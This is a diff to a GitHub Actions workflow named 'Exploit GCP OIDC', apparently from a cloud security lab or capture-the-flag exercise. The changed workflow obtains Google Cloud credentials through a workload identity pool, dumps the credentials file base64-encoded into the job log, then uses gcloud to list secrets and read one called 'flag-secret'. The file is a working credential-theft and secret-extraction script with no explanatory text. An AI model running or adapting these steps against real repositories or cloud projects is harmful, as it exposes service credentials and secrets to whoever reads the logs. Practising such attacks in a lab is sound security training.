@@ -1,20 +1,17 @@
-name: Check GCP action
+name: Exploit GCP OIDC  
 on:
   workflow_dispatch:
-  pull_request:
-    branches:
-      - main
 
 permissions:
   id-token: write
 
 jobs:
-  Get_OIDC_ID_token:
+  exploit:
     runs-on: ubuntu-latest
     steps:
       - id: "auth"
         name: "Authenticate to GCP"
-        uses: 'google-github-actions/auth@v0.3.1'
+        uses: "google-github-actions/auth@latest"
         with:
           create_credentials_file: "true"
           workload_identity_provider: "projects/gcp-labs-5fpuihyc/locations/global/workloadIdentityPools/iam-lab-7-gh-pool/providers/iam-lab-7-gh-pool-oidc-provider"
@@ -22,7 +19,13 @@ jobs:
 
       - id: "dump-creds"
         name: "Dump Credentials"
-        run: |-
-          cat "${{ steps.auth.outputs.credentials_file_path }}" > creds.json
+        run: |
           echo "Base64-encoded credentials:"
-          cat creds.json | base64
+          cat "${{ steps.auth.outputs.credentials_file_path }}" | base64
+
+      - id: "extract-secret"
+        name: "Extract Secret"
+        run: |
+          gcloud auth login --brief --cred-file="${{ steps.auth.outputs.credentials_file_path }}"
+          gcloud secrets list
+          gcloud secrets versions access latest --secret=flag-secret
